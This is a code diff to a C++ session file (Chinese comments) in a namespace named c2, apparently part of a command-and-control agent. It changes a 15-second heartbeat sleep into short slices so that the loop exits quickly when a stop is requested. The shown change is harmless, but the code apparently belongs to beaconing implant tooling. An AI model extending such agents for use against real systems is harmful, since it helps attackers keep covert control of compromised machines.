@@ -1,6 +1,7 @@
 // session.cpp — 握手与心跳实现
 #include "session.h"
 
+#include "agent_runtime.h"
 #include "crypto.h"
 #include "net.h"
 #include "protocol.h"
@@ -131,8 +132,13 @@ namespace c2
 
         while (running->load())
         {
-            Sleep(15000); // 心跳周期 15s
-            if (!running->load())
+            // 心跳周期 15s：分片睡眠，便于停止时快速退出
+            for (int slept = 0; slept < 15000 && running->load() &&
+                !agent_stop_requested(); slept += 200)
+            {
+                Sleep(200);
+            }
+            if (!running->load() || agent_stop_requested())
                 break;
 
             std::vector<uint8_t> sealed;
